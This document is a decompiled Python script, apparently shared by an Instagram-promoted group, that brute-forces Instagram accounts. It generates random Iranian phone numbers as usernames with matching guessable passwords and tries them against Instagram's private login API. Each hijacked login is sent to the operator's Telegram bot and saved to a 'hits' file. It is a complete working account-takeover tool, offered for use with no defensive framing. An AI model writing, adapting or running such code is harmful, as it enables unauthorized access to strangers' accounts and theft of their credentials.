# encoding: utf-8
# Decoded by HackerModePro tool...
# Copyright: PSH-TEAM
# Follow us on Instagram ( @51u__ )
# Embedded file name: string
import os, webbrowser
webbrowser.open('https://instagram.com/51u__?utm_medium=copy_link')
import sys, requests
os.system('clear')
try:
    import os, sys, random, requests, time, json, secrets, uuid, subprocess
    from bs4 import BeautifulSoup as Alosh
    from uuid import uuid4
    from time import sleep
    import webbrowser
except ImportError as Alosh:
    try:
        os.system('pip install requests')
        os.system('pip install bs4')
    finally:
        Alosh = None
        del Alosh

else:
    Z = '\x1b[1;31m'
    X = '\x1b[1;33m'
    Z1 = '\x1b[2;31m'
    F = '\x1b[2;32m'
    A = '\x1b[2;34m'
    C = '\x1b[2;35m'
    C = '\x1b[1;97m'
    B = '\x1b[2;36m'
    Y = '\x1b[1;34m'
    E = '\x1b[1;31m'
    ali = '                                                   \n  \ انتضر نفحصلك حساب\n '
    print(ali)
    tok = input(Z + '[' + F + '⌯' + Z + ']' + X + 'حط توكنك عشان يوصلك الصيد' + Z + ' :\n' + B)
    ID = input(Z + '[' + F + '⌯' + Z + ']' + X + ' حط ايديك برضو ' + Z + ' :\n' + B)
    os.system('clear')
    sr = 0
    bd = 0
    ht = 0
    ib = 0
    start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n [{ht}] تم تشغيل الادا انتضر يصيدلك حساب انستقرام. تابعني @51u__ ").json()
    id_msg = start_msg['result']['message_id']
    t = time.localtime()
    current_time = time.strftime('%H:%M:%S', t)
    sleep(1)
    w = 'https://pastebin.com/raw/mpWBGQKF'
    rss = requests.get(w).text
    if '' in rss:
        sleep(0.1)
        r = requests.Session()
        user = '0123456789'
        while True:
            us = str(''.join((random.choice(user) for i in range(7))))
            username = '+98913' + us
            password = '0913' + us
            url = 'https://i.instagram.com/api/v1/accounts/login/'
            headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'/',  'Cookie':'missing',  'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
            uid = str(uuid4())
            data = {'uuid':uid,  'password':password,  'username':username,  'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
            req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
            if 'logged_in_user' in req_login.text:
                ht += 1
                tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= جبنا لك حساب انستقرام  تابعني @51u__\n☆•━─────━❪ʚĭɞ❫━─────━•☆\n.يوزر [ {username} ]\n.رمز [ {password} ]\n•━─────━❪ʚĭɞ❫━─────━•\n @51u__\n  "
                i = requests.post(tlg)
                with open('insta-hits.txt', 'a') as (HACKED):
                    HACKED.write('{}:{}'.format(username, password))
            elif '"message":"challenge_required","challenge"' in req_login.text:
                ib += 1
                sr += 1
            else:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f" \n\n\x1b[1;31m--------------------------------\n        ᶜʳᵒʷᵉ\n\x1b[1;31m--------------------------------\n\n          \x1b[1;33m<\x1b[2;32m  استنى يحلو نفحص \\>                                                                                                                                                                \n{E}({X}{username}{E}) {B} ➥ {E}({X}{password}{E})\n{E}-------------------------------\n{E}({X}➥{E}){X}سكيور {E} ➥  {X}{sr}\n{E}({F}➥{E}){F}منيوك{E} ➥  {F}{ht}\n{E}({B}➥{E}){B} الفحص {E} ➥ {B}{bd}\n{E}-------------------------------\n{X}Instagram {E}: {F}\n  @51u__             \n                    ")
                bd += 1

    else:
        ht += 1
